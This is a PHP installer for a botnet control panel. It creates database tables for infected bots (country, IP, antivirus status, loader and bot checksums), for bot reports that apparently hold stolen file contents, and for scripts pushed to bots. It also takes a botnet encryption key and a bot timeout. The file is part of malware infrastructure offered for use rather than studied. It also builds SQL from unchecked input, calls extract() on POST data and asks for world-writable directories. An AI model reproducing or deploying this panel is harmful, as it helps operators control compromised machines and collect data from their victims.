	<?php

define("TPL_TITLE", "Install");
require_once("../core/global.php"); 

$sql_table = array();

$sql_table["bots"] = "
`bot_id` varchar(100) not null unique,
`bot_version` int unsigned not null,
`country` char(2) not null,
`os_version` tinyblob not null,
`ipv4` int unsigned not null,
`nat` bool not null,
`av` tinyint unsigned not null,
`rtime_last_update` int unsigned not null,
`rtime_first` int unsigned not null,
`rtime_last` int unsigned not null,
`rtime_online` int unsigned not null,
`loader_crc` int unsigned not null,
`bot_crc` int unsigned not null,
`config_crc` int unsigned not null";

$sql_table["reports"] = "
`id` int unsigned not null auto_increment primary key,
`bot_id` varchar(100) not null,
`path` text not null,
`type` int unsigned not null,
`rtime` int unsigned not null,
`content` longtext not null";

$sql_table["scripts"] = "
`id` int unsigned not null auto_increment primary key,
`extern_id` varbinary(16) not null,
`name` varchar(128) not null,
`time_created` int unsigned not null,
`flag_enabled` bool not null,
`send_limit` int unsigned not null,
`bots` text not null,
`countries` text not null,
`content` text not null";

$sql_table["scripts_stat"] = "
`id` int unsigned not null auto_increment primary key,
`extern_id` varbinary(16) not null,
`bot_id` varchar(100) not null,
`type` tinyint(1) not null default 1,
`rtime` int unsigned not null,
`report` text,
UNIQUE (`extern_id`, `bot_id`, `type`)";

$sql_table["geo"] = "
`l` int unsigned not null default '0',
`h` int unsigned not null default '0',
`c` char(2) not null default '--'";

$config_tpl = CsrGetConfigTpl();

if (!extension_loaded('mysqli')) {
	die("`mysqli` extension not found.");
}

$user = ''; $pass = ''; $sql_host = "127.0.0.1"; $sql_user = ''; $sql_pass = ''; $sql_db = ''; $botnet_crypt_key = ''; $ip_address = ''; $bot_timeout = '16';
$err_mes = '';
$success_mes = '';

$pathToConfig = "../core/config.php";
$isUpdate = file_exists($pathToConfig);

if ($isUpdate) $help =  "This application update/repair and reconfigure your control panel on this server. <br/>If you want make new installation, please remove file 'core/config.php'.";
else           $help =  "This application install and configure your control panel on this server. <br/> Please type settings and press 'Install'.";

if ($isUpdate && isset($_POST['update']))
{
	require_once($pathToConfig);
	extract($config);
	
	@$db_con = mysqli_connect($sql_host, $sql_user, $sql_pass);
	if ($db_con)
	{
		if (mysqli_select_db($db_con, $sql_db)) 
		{
			foreach ($sql_table as $tableName => $table)
			{
				if ($tableName == "reports")
				{ }
				else if ($tableName == "geo") 
				{ }
				else 
				{
					$rows = explode(",", $table);
					
					foreach ($rows as &$row) 
					{
						if (!mysqli_query($db_con, "create table if not exists `{$tableName}` ({$table}) engine=MyISAM default charset=" . SQL_CODEPAGE . " collate = " . SQL_COLLATE)) {
							$err_mes = mysqli_error($db_con);
							break;
						}
						//alter table {$table} modify {$column} {$type};
						$row = trim(str_replace("\r\n", "", $row));
						mysqli_query($db_con, "ALTER TABLE `{$tableName}` ADD {$row}");
					}
				}
			}
			
			if (!$err_mes)
				$success_mes = "<p> Good update, please remove \"/install\" dir. </p>";
		}
		else
			$err_mes = mysqli_connect_error($db_con);
	}
	else
		$err_mes = mysqli_connect_error($db_con);
}
else
if (isset($_POST['install']))
{
	foreach ($_POST as $k => $v) {
		$_POST[$k] = trim($v);
	}
	extract($_POST);
	
	if (strlen($user) < 4 || strlen($user) > 16) {
		$err_mes = "Bad user";
	}
	else if(strlen($pass) < 8 || strlen($pass) > 32) {
		$err_mes = "Bad password";
	}
	else if(strlen($sql_host) == 0 || strlen($sql_host) > 255) {
		$err_mes = "Bad mysql host";
	}
	else if(strlen($sql_user) == 0 || strlen($sql_user) > 255) {
		$err_mes = "Bad mysql user";
	}
	else if(strlen($sql_pass) > 255) {
		$err_mes = "Bad mysql password";
	}
	else if(strlen($sql_db) == 0 || strlen($sql_db) > 255) {
		$err_mes = "Bad database";
	}
	else if(strlen($botnet_crypt_key) < 6 || strlen(botnet_crypt_key) > 32) {
		$err_mes = "Bad encryption key";
	}
	else if(strlen($bot_timeout) == 0 || $bot_timeout < 1 || $bot_timeout > 60) {
		$err_mes = "Bad timeout";
	}
	
	if (!$err_mes) 
	{
		@$db_con = mysqli_connect($sql_host, $sql_user, $sql_pass);
		
		if (!$db_con) {
			$err_mes = mysqli_connect_error($db_con);
		}
		else 
		{
			if (mysqli_select_db($db_con, $sql_db)) 
			{
				$cache_file = "../tmp/update_data_" . rand(1, 0xffff) . ".cache";
				file_put_contents($cache_file, 0);

				if (file_exists($cache_file))
				{
					$cache_file = substr($cache_file, 7); //../tmp/
					$config = sprintf($config_tpl, $user, md5($pass), $sql_host, $sql_user, $sql_pass, $sql_db, $botnet_crypt_key, $bot_timeout, "http://", "http://", "http://", $cache_file);
					file_put_contents("../core/config.php", $config);
					if (file_exists("../core/config.php"))
					{
						foreach ($sql_table as $k => $v) 
						{
							mysqli_query($db_con, "drop table if exists `" . $k. "`");
							mysqli_query($db_con, "create table `" . $k . "` (" . $v . ") engine=MyISAM default charset=" . SQL_CODEPAGE . " collate = " . SQL_COLLATE) or die(mysqli_error($db_con));
						
							if ($k == "geo") 
							{
								if(($list = file("geo.txt")))
								{
									foreach($list as $item)
									{
										$cn = explode("\0", $item, 3);
										mysqli_query($db_con, "insert into `geo` (`l`, `h`, `c`) values (" . $cn[0] . ", " . $cn[1] . ", \"" . $cn[2] . "\")");
									}
								}
							}
						}
						$success_mes = "Install success, please remove \"/install\" dir.";	
					}
					else {
						unlink($cache_file);
						$err_mes = "Config can't create, pls set rights (777) on \"/core\" dir.";
					}
				}
				else
					$err_mes = "Cache file can't create, pls set rights (777) on \"/tmp\" dir.";
			}
			else 
				$err_mes = mysqli_error($db_con);
		}
	}
}

ob_start();
?>

<form class="form-horizontal" method='post'>
	<? if (!$isUpdate) { ?> 
	<p class="head"> <b> Site </b> </p>
	<div class="row">
		<div class="col-md-8">
			User (4-16 chars): <input class="form-control input-sm" type="text" name='user' value='<?=$user?>'>
		</div>
	</div>

	<div class="row">
		<div class="col-md-12">
			Password (8-32 chars): <input class="form-control input-sm" type="text" name='pass' value='<?=$pass?>'>
		</div>
	</div>
	
	<p class="head"><b> Mysql </b> </b> 
	
	<div class="row">
		<div class="col-md-8">
			Host: <input class="form-control input-sm" name='sql_host' value='<?=$sql_host?>'>
		</div>
	</div>
	
	<div class="row">
		<div class="col-md-10">
			User: <input class="form-control input-sm" name='sql_user' value='<?=$sql_user?>'>
		</div>
	</div>
	
	<div class="row">
		<div class="col-md-12">
			Password: <input class="form-control input-sm" name='sql_pass' value='<?=$sql_pass?>'>
		</div>
	</div>
	
	<div class="row">
		<div class="col-md-8">
			Database: <input class="form-control input-sm" name='sql_db' value='<?=$sql_db?>'>
		</div>
	</div>
	
	<p class="head"> <b> Botnet </b> </b> 
	
	<div class="row">
		<div class="col-md-12">
			Encryption key (6-32 chars): 
			<input class="form-control input-sm" type="text" name='botnet_crypt_key' value='<?=$botnet_crypt_key?>'>
		</div>
	</div>
	
	
	<div class="row">
		<div class="col-md-8">
			Bot timeout (1-60 min): <input class="form-control input-sm" type="text" name='bot_timeout' value='<?=$bot_timeout?>'>
		</div>
	</div>
	
	<? } else { ?>
	<br/>
	<? } ?>
	
	<div class="row">
		<div class="col-md-2">
			<? if ($isUpdate) { ?>
				<button type="submit" name='update' class="btn-sm btn-default">Update</button> 
			<? } else { ?>
				<button type="submit" name='install' class="btn-sm btn-default">Install</button> 
			<? } ?>
		</div>
	</div>

	<div class="text-danger controls"><?=$err_mes?></div>
	<div class="text-success controls"><?=$success_mes?></div>
	
	<p> <?=$help?> </p>
</form>

<?php 
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents("../" . TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array("../" . TPL_PATH, "", TPL_TITLE), $header_tpl);

$body_tpl = file_get_contents("../" . TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array('', "install", $content), $body_tpl);
$footer_tpl = file_get_contents("../" . TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents("../" . TPL_PATH . "main.html"));
?>